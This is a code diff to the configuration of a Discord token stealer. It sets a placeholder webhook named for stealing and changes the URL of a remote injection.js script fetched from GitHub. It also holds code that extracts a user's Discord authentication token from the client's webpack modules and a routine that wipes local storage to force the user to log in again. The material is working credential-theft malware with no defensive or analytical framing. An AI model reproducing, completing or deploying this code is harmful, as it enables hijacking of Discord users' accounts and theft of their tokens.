@@ -34,7 +34,7 @@ const CONFIG = {
     webhook: '%WEBHOOK_STEALER%',
     auto_user_profile_edit: 'false',
     auto_email_update: 'false',
-    injection_url: 'https://raw.githubusercontent.com/itinhoz/d/main/injection.js',
+    injection_url: 'https://raw.githubusercontent.com/itwd/d-injector/main/injection.js',
     get: {
         token: () => execScript(`(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`),
         logout: () => execScript(`function clearAllDiscordData() {const iframe = document.createElement('iframe');document.body.appendChild(iframe);const discordLocalStorage = iframe.contentWindow.localStorage;discordLocalStorage.clear();discordLocalStorage.token = null;discordLocalStorage.tokens = null;discordLocalStorage.MultiAccountStore = null;document.body.removeChild(iframe);setTimeout(() => window.location.reload(), 1000);} clearAllDiscordData();`),
